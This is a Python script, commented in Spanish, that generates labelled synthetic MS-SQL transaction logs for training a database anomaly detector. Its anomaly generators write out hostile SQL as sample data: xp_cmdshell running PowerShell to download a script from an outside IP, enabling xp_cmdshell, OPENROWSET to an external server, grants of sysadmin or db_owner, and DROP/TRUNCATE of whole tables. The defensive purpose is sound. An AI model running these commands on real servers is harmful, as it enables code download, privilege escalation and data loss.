"""
Genera un dataset sintético de transacciones MS-SQL para entrenar y probar
el modelo de detección de anomalías de la fase reactiva.

Las transacciones normales salen de los perfiles del catálogo
(catalogo_activos/perfiles.csv): cada usuario trabaja en su horario, desde
sus aplicaciones habituales, sobre las tablas propias de su rol y solo toca
columnas sensibles para las que su rol está autorizado.

Para que el modelo no aprenda reglas triviales se incluyen:
    - Casos normales "difíciles": trabajo remoto por VPN, cuentas de servicio
      en la madrugada, reportes grandes de analistas, mantenimiento de DBAs.
    - Anomalías sutiles: una sola señal débil (ej. aplicación no habitual).
    - Anomalías combinadas: dos señales a la vez (ej. madrugada + IP externa).

Patrones de anomalía (columna tipo_anomalia):
    fuera_de_horario, ip_externa, acceso_no_autorizado, exfiltracion_masiva,
    operacion_destructiva, escalamiento_privilegios, aplicacion_no_habitual,
    comando_peligroso.

Columnas: timestamp, usuario, rol, ip_origen, ip_destino, aplicacion,
tabla_afectada, columna_afectada, tipo_operacion, sentencia_sql,
filas_afectadas, es_anomalo, tipo_anomalia. Las dos últimas son ground
truth: no deben usarse como features.

Uso:
    python fase_reactiva/generar_dataset.py
    python fase_reactiva/generar_dataset.py --filas 10000 --anomalias 0.08 --semilla 7
"""

import argparse
import ipaddress
import os
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path

import pandas as pd

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import catalogo_activos  # noqa: E402

DIR_DATOS = os.path.join(os.path.dirname(__file__), "datos")
RUTA_SALIDA = os.path.join(DIR_DATOS, "transacciones_sinteticas.csv")
RUTA_DEMO = os.path.join(DIR_DATOS, "transacciones_demo.csv")

N_FILAS = 5000
N_FILAS_DEMO = 400
PROPORCION_ANOMALIAS = 0.10
PROPORCION_NORMALES_DIFICILES = 0.12
PROPORCION_ANOMALIAS_COMBINADAS = 0.30
SEMILLA = 42

FECHA_BASE = datetime(2026, 6, 1)
DIAS = 90

# Esquema simplificado de la base de datos de ejemplo: tabla -> (llave, columnas).
ESQUEMA = {
    "Clientes": ("id_cliente", ["nombre_completo", "numero_documento", "ciudad", "fecha_registro"]),
    "Empleados": ("id_empleado", ["nombre", "cargo", "area", "salario", "cuenta_bancaria"]),
    "Transacciones": ("id_transaccion", ["fecha_transaccion", "monto", "tarjeta_credito", "estado"]),
    "Usuarios": ("id_usuario", ["email", "password_hash", "activo", "ultimo_acceso"]),
    "Productos": ("id_producto", ["nombre", "precio", "categoria", "stock"]),
    "Pedidos": ("id_pedido", ["id_cliente", "fecha_pedido", "estado", "total"]),
    "Auditoria": ("id_log", ["log_acceso", "fecha_evento"]),
}

# Tablas y operaciones habituales de cada rol.
ACCESO_HABITUAL = {
    "DBA": {t: ["SELECT", "UPDATE", "INSERT"] for t in ESQUEMA},
    "RRHH": {"Empleados": ["SELECT", "UPDATE", "INSERT"]},
    "Analista_Financiero": {"Transacciones": ["SELECT", "INSERT"], "Pedidos": ["SELECT"], "Productos": ["SELECT"]},
    "Soporte": {"Clientes": ["SELECT", "UPDATE"], "Usuarios": ["SELECT", "UPDATE"], "Pedidos": ["SELECT", "UPDATE"]},
    "Analista_Seguridad": {"Auditoria": ["SELECT"], "Usuarios": ["SELECT"]},
    "Desarrollador": {"Productos": ["SELECT", "UPDATE", "INSERT"], "Pedidos": ["SELECT", "UPDATE"]},
    "Servicio_Batch": {"Transacciones": ["SELECT", "INSERT"], "Pedidos": ["UPDATE"], "Auditoria": ["INSERT"]},
    "Servicio_App": {
        "Clientes": ["SELECT", "INSERT"],
        "Pedidos": ["SELECT", "INSERT", "UPDATE"],
        "Productos": ["SELECT"],
        "Usuarios": ["SELECT"],
    },
}

REDES_INTERNAS = ["10.0.1.0/24", "10.0.2.0/24", "192.168.1.0/24"]
REDES_VPN = ["172.16.10.0/24"]
REDES_EXTERNAS = ["187.45.0.0/16", "45.227.0.0/16", "201.14.0.0/16", "103.21.0.0/16"]
APLICACIONES_NO_HABITUALES = ["sqlcmd", "python-pyodbc", "Excel-ODBC", "desconocida"]

SERVIDOR_PRODUCCION = "10.0.0.5"
SERVIDOR_REPORTES = "10.0.0.6"


class Generador:
    def __init__(self, semilla: int):
        self.rnd = random.Random(semilla)
        self.perfiles = catalogo_activos.cargar_perfiles()
        self.catalogo = catalogo_activos.cargar_objetos_sensibles()
        self.sensibles = {(o["tabla"], o["columna"]): o for o in self.catalogo}

    # ---------- utilidades ----------

    def _ip(self, redes: list[str]) -> str:
        red = ipaddress.ip_network(self.rnd.choice(redes))
        return str(red.network_address + self.rnd.randint(2, red.num_addresses - 2))

    def _autorizado(self, rol: str, tabla: str, columna: str) -> bool:
        obj = self.sensibles.get((tabla, columna))
        return obj is None or rol in obj["roles_autorizados"]

    def _dia(self) -> datetime:
        # Más actividad entre semana que en fin de semana.
        while True:
            dia = FECHA_BASE + timedelta(days=self.rnd.randint(0, DIAS - 1))
            if dia.weekday() < 5 or self.rnd.random() < 0.25:
                return dia

    def _timestamp(self, horas: list[int]) -> str:
        hora = self.rnd.choice(horas)
        return self._dia().replace(
            hour=hora, minute=self.rnd.randint(0, 59), second=self.rnd.randint(0, 59)
        ).isoformat()

    def _horas_en_horario(self, perfil: dict) -> list[int]:
        return [h for h in range(24) if catalogo_activos.esta_en_horario(h, perfil["hora_inicio"], perfil["hora_fin"])]

    def _horas_fuera_de_horario(self, perfil: dict) -> list[int]:
        horas = [h for h in range(24) if h not in self._horas_en_horario(perfil)]
        # Se prefieren horas claramente inusuales (madrugada) si existen.
        madrugada = [h for h in horas if h <= 4 or h >= 23]
        return madrugada or horas

    def _sentencia(self, tipo: str, tabla: str, columna: str, filtro: str = "pk") -> str:
        llave = ESQUEMA[tabla][0]
        if filtro == "pk":
            where = f" WHERE {llave} = {self.rnd.randint(1, 99999)}"
        elif filtro == "rango":
            where = f" WHERE {llave} BETWEEN {(a := self.rnd.randint(1, 90000))} AND {a + self.rnd.randint(50, 5000)}"
        else:
            where = ""
        if tipo == "SELECT":
            return f"SELECT {llave}, {columna} FROM {tabla}{where};"
        if tipo == "UPDATE":
            return f"UPDATE {tabla} SET {columna} = @valor{where};"
        if tipo == "INSERT":
            return f"INSERT INTO {tabla} ({columna}) VALUES (@valor);"
        if tipo == "DELETE":
            return f"DELETE FROM {tabla}{where};"
        raise ValueError(tipo)

    def _fila(self, perfil, tabla, columna, tipo, sentencia, filas, ts, ip_origen, aplicacion, es_anomalo, tipo_anomalia):
        return {
            "timestamp": ts,
            "usuario": perfil["usuario"],
            "rol": perfil["rol"],
            "ip_origen": ip_origen,
            "ip_destino": SERVIDOR_REPORTES if aplicacion == "PowerBI" else SERVIDOR_PRODUCCION,
            "aplicacion": aplicacion,
            "tabla_afectada": tabla,
            "columna_afectada": columna,
            "tipo_operacion": tipo,
            "sentencia_sql": sentencia,
            "filas_afectadas": filas,
            "es_anomalo": int(es_anomalo),
            "tipo_anomalia": tipo_anomalia,
        }

    def _acceso_habitual(self, perfil: dict) -> tuple[str, str, str]:
        """(tabla, columna, operación) dentro del perfil y autorizado para el rol."""
        tablas = ACCESO_HABITUAL[perfil["rol"]]
        tabla = self.rnd.choice(list(tablas))
        columnas = [c for c in ESQUEMA[tabla][1] if self._autorizado(perfil["rol"], tabla, c)]
        return tabla, self.rnd.choice(columnas), self.rnd.choice(tablas[tabla])

    def _filas_normales(self, tipo: str) -> tuple[str, int]:
        if tipo == "INSERT":
            return "pk", 1
        if self.rnd.random() < 0.8:
            return "pk", 1
        return "rango", self.rnd.randint(2, 400)

    # ---------- transacciones normales ----------

    def normal(self) -> dict:
        return self.normal_de(self.rnd.choice(self.perfiles))

    def normal_dificil(self) -> dict:
        """Transacciones legítimas que se parecen a una anomalía en alguna señal."""
        caso = self.rnd.choice(["vpn", "reporte_grande", "mantenimiento_dba", "batch_nocturno"])
        fila = self.normal()

        if caso == "vpn":
            fila["ip_origen"] = self._ip(REDES_VPN)
        elif caso == "reporte_grande":
            perfil = self.rnd.choice([p for p in self.perfiles if p["rol"] == "Analista_Financiero"])
            fila = self._fila(
                perfil, "Transacciones", "monto", "SELECT",
                "SELECT estado, SUM(monto) AS total FROM Transacciones "
                "WHERE fecha_transaccion >= DATEADD(MONTH, -1, GETDATE()) GROUP BY estado;",
                self.rnd.randint(5000, 40000),
                self._timestamp(self._horas_en_horario(perfil)),
                self._ip(REDES_INTERNAS), "PowerBI", False, "",
            )
        elif caso == "mantenimiento_dba":
            perfil = self.rnd.choice([p for p in self.perfiles if p["rol"] == "DBA"])
            fila = self._fila(
                perfil, "Pedidos", "*", "DELETE",
                f"DELETE FROM Pedidos WHERE fecha_pedido < '{2019 + self.rnd.randint(0, 3)}-01-01' AND estado = 'CANCELADO';",
                self.rnd.randint(100, 3000),
                self._timestamp(self._horas_en_horario(perfil)),
                self._ip(REDES_INTERNAS), "SSMS", False, "",
            )
        else:
            perfil = next(p for p in self.perfiles if p["rol"] == "Servicio_Batch")
            fila = self._fila(
                perfil, "Transacciones", "monto", "INSERT",
                "INSERT INTO Transacciones (monto) SELECT monto FROM Transacciones_Staging;",
                self.rnd.randint(500, 8000),
                self._timestamp(self._horas_en_horario(perfil)),
                self._ip(["10.0.3.0/24"]), "BatchNocturno", False, "",
            )
        return fila

    # ---------- anomalías ----------

    def anomalia(self) -> dict:
        patrones = [
            "fuera_de_horario", "ip_externa", "acceso_no_autorizado", "exfiltracion_masiva",
            "operacion_destructiva", "escalamiento_privilegios", "aplicacion_no_habitual", "comando_peligroso",
        ]
        pesos = [18, 16, 20, 12, 10, 6, 12, 6]
        patron = self.rnd.choices(patrones, weights=pesos)[0]
        fila = getattr(self, f"_anomalia_{patron}")()
        fila["tipo_anomalia"] = patron

        # Algunas anomalías combinan una segunda señal de contexto.
        if self.rnd.random() < PROPORCION_ANOMALIAS_COMBINADAS:
            segunda = self.rnd.choice(["fuera_de_horario", "ip_externa", "aplicacion_no_habitual"])
            perfil = next(p for p in self.perfiles if p["usuario"] == fila["usuario"])
            # Una cuenta que opera 24 h no puede estar "fuera de horario".
            if segunda != patron and (segunda != "fuera_de_horario" or self._horas_fuera_de_horario(perfil)):
                if segunda == "fuera_de_horario":
                    fila["timestamp"] = self._timestamp(self._horas_fuera_de_horario(perfil))
                elif segunda == "ip_externa":
                    fila["ip_origen"] = self._ip(REDES_EXTERNAS)
                else:
                    fila["aplicacion"] = self.rnd.choice(APLICACIONES_NO_HABITUALES)
                fila["tipo_anomalia"] += f"+{segunda}"
        return fila

    def _perfil_humano(self) -> dict:
        return self.rnd.choice([p for p in self.perfiles if not p["rol"].startswith("Servicio_")])

    def _anomalia_fuera_de_horario(self) -> dict:
        perfil = self._perfil_humano()
        fila = self.normal_de(perfil)
        fila["timestamp"] = self._timestamp(self._horas_fuera_de_horario(perfil))
        fila["es_anomalo"] = 1
        return fila

    def _anomalia_ip_externa(self) -> dict:
        perfil = self.rnd.choice(self.perfiles)
        fila = self.normal_de(perfil)
        fila["ip_origen"] = self._ip(REDES_EXTERNAS)
        fila["es_anomalo"] = 1
        return fila

    def _anomalia_aplicacion_no_habitual(self) -> dict:
        perfil = self._perfil_humano()
        fila = self.normal_de(perfil)
        fila["aplicacion"] = self.rnd.choice(APLICACIONES_NO_HABITUALES)
        fila["es_anomalo"] = 1
        return fila

    def _anomalia_acceso_no_autorizado(self) -> dict:
        perfil = self._perfil_humano()
        opciones = [
            (o["tabla"], o["columna"]) for o in self.catalogo
            if perfil["rol"] not in o["roles_autorizados"] and o["nivel_sensibilidad"] in {"medio", "alto"}
        ]
        tabla, columna = self.rnd.choice(opciones)
        tipo = self.rnd.choice(["SELECT", "SELECT", "UPDATE"])
        return self._fila(
            perfil, tabla, columna, tipo, self._sentencia(tipo, tabla, columna, "pk"), 1,
            self._timestamp(self._horas_en_horario(perfil)),
            self._ip(REDES_INTERNAS),
            self.rnd.choice(perfil["aplicaciones_habituales"]),
            True, "",
        )

    def _anomalia_exfiltracion_masiva(self) -> dict:
        perfil = self._perfil_humano()
        tabla, columna = self.rnd.choice(
            [(o["tabla"], o["columna"]) for o in self.catalogo if o["nivel_sensibilidad"] == "alto"]
        )
        return self._fila(
            perfil, tabla, columna, "SELECT", self._sentencia("SELECT", tabla, columna, "ninguno"),
            self.rnd.randint(20000, 250000),
            self._timestamp(self._horas_en_horario(perfil)),
            self._ip(REDES_INTERNAS),
            self.rnd.choice(perfil["aplicaciones_habituales"] + ["SSMS"]),
            True, "",
        )

    def _anomalia_operacion_destructiva(self) -> dict:
        perfil = self._perfil_humano()
        tabla = self.rnd.choice(["Clientes", "Empleados", "Transacciones", "Pedidos", "Auditoria"])
        tipo, sentencia = self.rnd.choice([
            ("DELETE", f"DELETE FROM {tabla};"),
            ("TRUNCATE", f"TRUNCATE TABLE {tabla};"),
            ("DROP", f"DROP TABLE {tabla};"),
        ])
        return self._fila(
            perfil, tabla, "*", tipo, sentencia, self.rnd.randint(10000, 500000) if tipo != "DROP" else 0,
            self._timestamp(self._horas_en_horario(perfil)),
            self._ip(REDES_INTERNAS), "SSMS", True, "",
        )

    def _anomalia_escalamiento_privilegios(self) -> dict:
        perfil = self._perfil_humano()
        tabla = self.rnd.choice(["Clientes", "Empleados", "Usuarios", "Transacciones"])
        cuenta = self.rnd.choice(self.perfiles)["usuario"]
        tipo, sentencia, tabla_afectada = self.rnd.choice([
            ("GRANT", f"GRANT SELECT ON {tabla} TO {cuenta};", tabla),
            ("EXEC", f"EXEC sp_addsrvrolemember '{cuenta}', 'sysadmin';", "-"),
            ("ALTER", f"ALTER ROLE db_owner ADD MEMBER {cuenta};", "-"),
        ])
        return self._fila(
            perfil, tabla_afectada, "*" if tabla_afectada != "-" else "-", tipo, sentencia, 0,
            self._timestamp(self._horas_en_horario(perfil)),
            self._ip(REDES_INTERNAS), "SSMS", True, "",
        )

    def _anomalia_comando_peligroso(self) -> dict:
        perfil = self._perfil_humano()
        sentencia = self.rnd.choice([
            "EXEC xp_cmdshell 'whoami';",
            "EXEC xp_cmdshell 'powershell -c \"Invoke-WebRequest http://198.51.100.7/p.ps1\"';",
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
            "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=203.0.113.9;Trusted_Connection=yes;', 'SELECT 1');",
        ])
        return self._fila(
            perfil, "-", "-", "EXEC", sentencia, 0,
            self._timestamp(self._horas_en_horario(perfil)),
            self._ip(REDES_INTERNAS), "SSMS", True, "",
        )

    def normal_de(self, perfil: dict) -> dict:
        tabla, columna, tipo = self._acceso_habitual(perfil)
        filtro, filas = self._filas_normales(tipo)
        return self._fila(
            perfil, tabla, columna, tipo, self._sentencia(tipo, tabla, columna, filtro), filas,
            self._timestamp(self._horas_en_horario(perfil)),
            self._ip(REDES_INTERNAS),
            self.rnd.choice(perfil["aplicaciones_habituales"]),
            False, "",
        )


def generar_dataset(
    n_filas: int = N_FILAS,
    proporcion_anomalias: float = PROPORCION_ANOMALIAS,
    semilla: int = SEMILLA,
) -> pd.DataFrame:
    """
    Genera un DataFrame sintético de transacciones MS-SQL.

    Args:
        n_filas: Número total de filas a generar.
        proporcion_anomalias: Proporción (0-1) de filas marcadas como anómalas.
        semilla: Semilla aleatoria (mismo valor -> mismo dataset).

    Returns:
        pd.DataFrame con las transacciones sintéticas, ordenadas por timestamp.
    """
    gen = Generador(semilla)
    n_anomalas = max(1, round(n_filas * proporcion_anomalias))
    n_normales = n_filas - n_anomalas
    n_dificiles = round(n_normales * PROPORCION_NORMALES_DIFICILES)

    filas = [gen.normal() for _ in range(n_normales - n_dificiles)]
    filas += [gen.normal_dificil() for _ in range(n_dificiles)]
    filas += [gen.anomalia() for _ in range(n_anomalas)]

    return pd.DataFrame(filas).sort_values("timestamp").reset_index(drop=True)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--filas", type=int, default=N_FILAS, help="filas del dataset de entrenamiento")
    parser.add_argument("--filas-demo", type=int, default=N_FILAS_DEMO, help="filas del lote de demo para subir al front")
    parser.add_argument("--anomalias", type=float, default=PROPORCION_ANOMALIAS, help="proporción de anomalías (0-1)")
    parser.add_argument("--semilla", type=int, default=SEMILLA)
    args = parser.parse_args()

    os.makedirs(DIR_DATOS, exist_ok=True)

    df = generar_dataset(args.filas, args.anomalias, args.semilla)
    df.to_csv(RUTA_SALIDA, index=False)
    print(f"Dataset de entrenamiento: {len(df)} filas -> {RUTA_SALIDA}")
    print(f"  Anomalías: {int(df['es_anomalo'].sum())} ({df['es_anomalo'].mean():.1%})")
    print(df.loc[df["es_anomalo"] == 1, "tipo_anomalia"].str.split("+").str[0].value_counts().to_string())

    # Lote de demo con otra semilla: simula transacciones nuevas que el modelo no ha visto.
    demo = generar_dataset(args.filas_demo, args.anomalias, args.semilla + 1)
    demo.drop(columns=["es_anomalo", "tipo_anomalia"]).to_csv(RUTA_DEMO, index=False)
    print(f"Lote de demo (sin etiquetas): {len(demo)} filas -> {RUTA_DEMO}")


if __name__ == "__main__":
    main()
